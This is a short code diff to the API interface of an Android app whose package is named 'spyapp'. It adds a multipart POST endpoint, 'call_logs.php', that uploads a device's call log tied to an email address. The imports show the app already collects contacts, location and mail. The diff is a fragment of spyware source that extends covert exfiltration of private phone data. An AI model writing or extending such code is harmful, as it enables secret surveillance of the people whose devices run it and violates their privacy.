@@ -1,6 +1,7 @@
 package kkactive_india.in.spyapp;
 
 import kkactive_india.in.spyapp.MainPOJO.MainBean;
+import kkactive_india.in.spyapp.callLogPOJO.callsBean;
 import kkactive_india.in.spyapp.contactPOJO.contactBean;
 import kkactive_india.in.spyapp.locationPOJO.locationBean;
 import kkactive_india.in.spyapp.mailPOJO.mailBean;
@@ -53,5 +54,11 @@ public interface Allapi {
             @Part("contact") String n
     );
 
+    @Multipart
+    @POST("call_logs.php")
+    Call<callsBean> calls (
+            @Part("email") String m,
+            @Part("call_log") String n
+    );
 
 }
